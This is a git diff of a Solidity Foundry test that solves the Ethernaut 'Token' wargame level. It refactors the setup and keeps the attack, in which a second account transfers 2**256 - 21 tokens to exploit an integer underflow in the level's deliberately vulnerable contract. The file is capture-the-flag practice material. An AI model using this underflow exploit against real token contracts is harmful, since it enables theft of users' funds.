@@ -1,7 +1,6 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../Token/Token.sol";
 import "../Token/TokenFactory.sol";
 import "../Ethernaut.sol";
 
@@ -10,54 +9,54 @@ interface CheatCodes {
   function startPrank(address) external;
   // Resets subsequent calls' msg.sender to be `address(this)`
   function stopPrank() external;
+  // Sets an address' balance
+  function deal(address who, uint256 newBalance) external;
 }
 
 contract TokenTest is DSTest {
     CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
     Ethernaut ethernaut;
-    TokenFactory tokenFactory;
-    address levelAddress;
-    bool levelSuccessfullyPassed;
+    address eoaAddress = address(100);
 
     function setUp() public {
-        // Setup instances of the Ethernaut & TokenFactory contracts
+        // Setup instance of the Ethernaut contract
         ethernaut = new Ethernaut();
-        tokenFactory = new TokenFactory();
+        // Deal EOA address some ether
+        cheats.deal(eoaAddress, 5 ether);
     }
 
     function testTokenHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
 
-        // Register the Ethernaut Token level (this would have already been done on Rinkeby)
+        TokenFactory tokenFactory = new TokenFactory();
         ethernaut.registerLevel(tokenFactory);
-
-        // Add some ETH to the 0 address which we will be using 
-        payable(address(0)).transfer(1 ether);
-        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
-        cheats.startPrank(address(0));
-
-        // Set up the Level
-        levelAddress = ethernaut.createLevelInstance(tokenFactory);
-
-        // Cast the level address to the Token contract class
+        cheats.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
         Token ethernautToken = Token(payable(levelAddress));
-
         cheats.stopPrank();
-        // Change accounts, have to call the transfer function from a different account
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+
+        // Change accounts from the level was set up with, have to call the transfer function from a different account
         cheats.startPrank(address(1));
 
         // Transfer maximum amount of tokens without causing an overflow 
-        ethernautToken.transfer(address(0), (2**256 - 21));
+        ethernautToken.transfer(eoaAddress, (2**256 - 21));
 
+        // Switch back to original account
         cheats.stopPrank();
-        cheats.startPrank(address(0));
+        cheats.startPrank(eoaAddress);
 
-        // Submit level to the core Ethernaut contract
-        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
 
-        // Stop the prank - calls with no longer come from address(0) 
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         cheats.stopPrank();
-
-        // Verify the level has passed
         assert(levelSuccessfullyPassed);
     }
 }
